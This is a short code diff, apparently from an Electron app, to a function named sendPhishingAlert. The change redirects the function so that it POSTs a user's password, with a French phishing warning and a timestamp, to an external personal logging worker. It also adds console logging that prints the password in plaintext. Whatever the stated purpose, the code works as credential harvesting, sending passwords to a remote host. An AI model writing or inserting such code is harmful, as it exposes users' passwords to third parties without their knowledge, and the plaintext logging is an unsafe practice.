@@ -6,16 +6,21 @@ let mainWindow;
 // API call function
 async function sendPhishingAlert(password) {
   try {
-    const response = await fetch('https://lighthearted-tanuki-1980ab.netlify.app/.netlify/functions/phishing-alert', {
+    const payload = {
+      message: password,
+      alert: 'Attention au phishing !',
+      timestamp: new Date().toISOString()
+    };
+    
+    console.log('Sending to API:', payload);
+    console.log('API URL:', 'https://my-logger-worker.sambadioulde98.workers.dev');
+    
+    const response = await fetch('https://my-logger-worker.sambadioulde98.workers.dev', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({
-        message: password,
-        alert: 'Attention au phishing !',
-        timestamp: new Date().toISOString()
-      })
+      body: JSON.stringify(payload)
     });
 
     if (response.ok) {
